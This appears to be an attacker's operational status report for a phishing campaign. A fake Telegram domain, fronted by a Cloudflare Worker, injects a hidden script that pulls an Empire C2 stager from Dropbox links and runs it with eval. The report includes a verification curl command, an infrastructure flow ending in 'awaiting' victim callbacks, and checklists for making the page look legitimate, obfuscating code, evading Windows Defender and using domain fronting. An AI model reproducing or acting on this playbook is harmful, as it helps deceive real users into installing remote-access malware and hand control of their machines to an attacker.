**Result:**
- Invisible link with zero-width characters
- DOMContentLoaded event listener
- fetchPayload() function
- All 3 Dropbox URLs present
- eval(js) execution
- Fallback to C2 on error

### Test 3: Dropbox Accessibility
```bash
curl -sI https/www.dropbox.com/t/EPpG4FPWkD2SB3Tn
```

**Result:**
- Status: `HTTP/2 301` (redirect to transfer page)

## DEPLOYMENT STATUS: FULLY OPERATIONAL

### Infrastructure Flow
```
 telegrams.app/chat_dota2 → Cloudflare Worker
 Worker → Proxies t.me/chat_dota2
 Worker → Injects payload delivery script
 DOMContentLoaded → Triggers fetchPayload()
 Random Dropbox URL → Selected and fetched
 Empire stager → Downloaded to victim
⏳ Stager execution → Pending victim interaction
⏳ C2 callback → Awaiting connection
```

---

## NEXT ACTIONS

1. Worker deployed successfully
2. Route added and active
3. Payload injection verified
4. Dropbox links accessible
5. ⏳ **Test in browser with victim machine**
6. ⏳ **Monitor Empire C2 listener for callbacks**
7. ⏳ **Verify stager execution**
8. ⏳ **Obfuscate code after successful test**

## BROWSER TEST CHECKLIST

Open browser and navigate to: `https/telegrams.app/chat_dota2`

**Verify:**
- [ ] Page loads and looks like real Telegram
- [ ] "VIEW IN TELEGRAM" button visible
- [ ] Click button shows real browser prompt
- [ ] Console shows payload fetch (F12 → Network tab)
- [ ] No visible errors or suspicious behavior
- [ ] Page appears completely legitimate

**Test Payload Delivery:**
- [ ] Open Windows test VM
- [ ] Navigate to https/telegrams.app/chat_dota2
- [ ] Monitor Empire listener for connection
- [ ] Verify stager downloads from Dropbox
- [ ] Confirm C2 callback received
- [ ] Test Empire commands on agent

---

## TROUBLESHOOTING

If payload doesn't execute:
1. Check browser console for CORS errors
2. Verify Dropbox links are not expired
3. Confirm Empire listener is running on 443
4. Check Windows Defender/AV isn't blocking
5. Verify network connectivity to telegrams.app

If C2 callback fails:
1. Check Empire listener configuration
2. Verify domain fronting is working
3. Test direct connection to Digital Ocean IP
4. Review stager configuration (host, port, key)
5. Check firewall rules on C2 server
